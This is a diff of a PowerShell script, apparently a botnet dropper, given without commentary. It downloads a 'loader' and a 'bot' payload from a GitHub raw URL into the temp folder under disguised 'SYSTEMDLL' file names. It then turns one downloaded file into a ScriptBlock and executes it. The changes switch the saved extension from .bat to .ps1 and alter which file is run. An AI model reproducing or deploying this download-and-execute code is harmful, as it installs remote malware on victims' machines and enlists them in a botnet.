@@ -6,15 +6,14 @@ $botnetCode = 'Add-Type -AssemblyName System.IO.Compression.FileSystem'; #Always
 
 $wc = [System.Net.WebClient]::new();
 $loader = "https://raw.githubusercontent.com/ghostleaper/rhino/main/loader";
-$wc.DownloadFile("$loader","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat");
+$wc.DownloadFile("$loader","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.ps1");
 
 $bot = "https://raw.githubusercontent.com/ghostleaper/rhino/main/bot";
 $wc.DownloadFile("$bot","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.log");
 
 
-$AnyFile = Get-Content $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.log -Raw
+$AnyFile = Get-Content $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.ps1 -Raw
 
     $ScriptBlock = [System.Management.Automation.ScriptBlock]::Create($AnyFile)
 
     & $ScriptBlock
-
